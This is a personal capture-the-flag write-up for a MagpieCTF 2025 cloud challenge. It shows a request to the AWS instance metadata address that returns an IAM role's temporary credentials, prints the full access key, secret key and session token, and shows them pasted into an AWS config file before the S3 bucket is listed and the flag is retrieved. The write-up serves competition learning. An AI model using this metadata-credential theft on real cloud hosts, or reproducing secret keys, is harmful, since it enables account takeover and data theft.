---
tags:
  - ctf
---
1. Jacky gave me this url to use: `http://169.254.169.254/latest/meta-data/iam/security-credentials/read-only-s3-role`
2. ![[MagpieCTF2025 The Teeny Disappearance-20250223063411321.webp|717]]
3. This is the response we get
```
{
  "Code" : "Success",
  "LastUpdated" : "2025-02-23T06:01:49Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIASJVQTSKPVQV2ZSTJ",
  "SecretAccessKey" : "BAluUdoVWXqzSsL+vG5/XtgI0CPwiI+DZJz9oi5H",
  "Token" : "IQoJb3JpZ2luX2VjENb//////////wEaCXVzLXdlc3QtMiJIMEYCIQDx5eYlqHvWs8KrX/Q9x3ju4Uko01q1FRrOuDsx4FnaTwIhANTImbRqs/nk9Pj03JQEGunGa/Rp8md7B8gA+Ipe3p4QKsUFCP///////////wEQABoMMTU4MjEwNDI5NTk5Igw4kFHTGBCv0jobONgqmQVJzIXhMIFN/8INprEljRCMxsqH08Q9qpLTJpFWU6Tt+XnZWBe10evpGxGuUA4nCGUbKJkB/wuxU5huuLv/2yadwfZlZY4kdyCwr5p8svr8FKor++xnfvBySZPAy1pL9G11I5jxHGDVsHAOg3m9TRhRC/bKINAoKH7oVsJVqy/eALFe0ZQPcdR1itqkKgV+fE/zn3OTckUmxat9SSGFs1i3Qegg4iAGibRH9PpLhzy01y0QaBXr8+uGtavxqzx8t21FkW8clEKJOQImMtLVxi/F8b2GWb+p4snG/3Tt8Z+PZGDdhNNbrLwKjpMZfkbgJGiyyFAtqCQhjlDvpGwzt8TJU3O+60v24WK/vaTtYxkVtHDEVdz75B3RojmlWpkRfZ3wBfrdkKlD3yG/bGuqnZSvvF4nVhD5mDqZYNGAZXLV0KPouDoIJ2vSk5svtDkkZx1PbnwYyDoWcdjd7Mal1PxeAQGwG3qg8DqUMa/PDVk2sMUsCxhIQyQSCXSEcrJB8OuP43+WsWPKzX0M717ROM6MEXav4EV0hNRn0IGtqpEHSGcS0GKWlqGJjehiB4/Azvai44bVZZ7cVCT6eEj+GuhvTrYfj3U9JfpA5MkqEKTF5+1Tmwd+nfp4F2UiOBGYJF2++SznFcrclMTqsuDx+nhKbiyZC+4mBAqrWLAJ15j5ysPrDBeqkD3kZ2oHuA9kHnb8I32oGmYfHxG7tjHPaNX6YROwqSOJK3HHP2XoWwl8g/QZdtvePX2Uc8T1r8oJYVAoQj6BVrgfXHMXNy90pJPBv7JJb3WdDmrgJdfHkDHhUvHf2i9wnDiLQmv52JBy3lVD9NnsIVqTrOkcD+jabvij+m/sv8TLgb8Zxbzn9cbezRacQLkcB8djUzDi8+q9BjqwAbDJ8wBv8cr3qeZCeoFCTHR5uWxhfkHRyUhllXGstp/7DR2MHA6DR1DophYlv5v4HTEDaC2aM4zfEDIRCAcU7x4dxvXKx2VS0HCO1Bz8QN9lkc/2arMaL5YIid5NGjVZd8tIxRJN19y3Oy6EIMHT8uCcQTYe8MTwEue8tYjGVxaI1HF+IF32n1tKlmqFvgEFQV4dFVjM0Gwu9RTrWC+XG412b4lxm1TNjLDjfrk61rXy",
  "Expiration" : "2025-02-23T12:13:24Z"
}
```
4. setup your `~/.aws/config`
```
[default]
[example]
aws_access_key_id = ASIASJVQTSKPVQV2ZSTJ
aws_secret_access_key = BAluUdoVWXqzSsL+vG5/XtgI0CPwiI+DZJz9oi5H
aws_session_token=IQoJb3JpZ2luX2VjENb//////////wEaCXVzLXdlc3QtMiJIMEYCIQDx5eYlqHvWs8KrX/Q9x3ju4Uko01q1FRrOuDsx4FnaTwIhANTImbRqs/nk9Pj03JQEGunGa/Rp8md7B8gA+Ipe3p4QKsUFCP///////////wEQABoMMTU4MjEwNDI5NTk5Igw4kFHTGBCv0jobONgqmQVJzIXhMIFN/8INprEljRCMxsqH08Q9qpLTJpFWU6Tt+XnZWBe10evpGxGuUA4nCGUbKJkB/wuxU5huuLv/2yadwfZlZY4kdyCwr5p8svr8FKor++xnfvBySZPAy1pL9G11I5jxHGDVsHAOg3m9TRhRC/bKINAoKH7oVsJVqy/eALFe0ZQPcdR1itqkKgV+fE/zn3OTckUmxat9SSGFs1i3Qegg4iAGibRH9PpLhzy01y0QaBXr8+uGtavxqzx8t21FkW8clEKJOQImMtLVxi/F8b2GWb+p4snG/3Tt8Z+PZGDdhNNbrLwKjpMZfkbgJGiyyFAtqCQhjlDvpGwzt8TJU3O+60v24WK/vaTtYxkVtHDEVdz75B3RojmlWpkRfZ3wBfrdkKlD3yG/bGuqnZSvvF4nVhD5mDqZYNGAZXLV0KPouDoIJ2vSk5svtDkkZx1PbnwYyDoWcdjd7Mal1PxeAQGwG3qg8DqUMa/PDVk2sMUsCxhIQyQSCXSEcrJB8OuP43+WsWPKzX0M717ROM6MEXav4EV0hNRn0IGtqpEHSGcS0GKWlqGJjehiB4/Azvai44bVZZ7cVCT6eEj+GuhvTrYfj3U9JfpA5MkqEKTF5+1Tmwd+nfp4F2UiOBGYJF2++SznFcrclMTqsuDx+nhKbiyZC+4mBAqrWLAJ15j5ysPrDBeqkD3kZ2oHuA9kHnb8I32oGmYfHxG7tjHPaNX6YROwqSOJK3HHP2XoWwl8g/QZdtvePX2Uc8T1r8oJYVAoQj6BVrgfXHMXNy90pJPBv7JJb3WdDmrgJdfHkDHhUvHf2i9wnDiLQmv52JBy3lVD9NnsIVqTrOkcD+jabvij+m/sv8TLgb8Zxbzn9cbezRacQLkcB8djUzDi8+q9BjqwAbDJ8wBv8cr3qeZCeoFCTHR5uWxhfkHRyUhllXGstp/7DR2MHA6DR1DophYlv5v4HTEDaC2aM4zfEDIRCAcU7x4dxvXKx2VS0HCO1Bz8QN9lkc/2arMaL5YIid5NGjVZd8tIxRJN19y3Oy6EIMHT8uCcQTYe8MTwEue8tYjGVxaI1HF+IF32n1tKlmqFvgEFQV4dFVjM0Gwu9RTrWC+XG412b4lxm1TNjLDjfrk61rXy
```
1. Run this to see if you are connected successfully
   ![[MagpieCTF2025 The Teeny Disappearance-20250223063609415.webp]]
![[MagpieCTF2025 The Teeny Disappearance-20250223063806456.webp]]
1. Do an ls to check what is in here. we ahve a directory
   ![[MagpieCTF2025 The Teeny Disappearance-20250223063734106.webp]]
2. Do another ls to check what is in that directory
   ![[MagpieCTF2025 The Teeny Disappearance-20250223064219175.webp]]
3. Download this one:
   ![[MagpieCTF2025 The Teeny Disappearance-20250223064348635.webp]]
4. The file contents are: `magpieCTF{14m_15_700_345y_70_m355_up}`
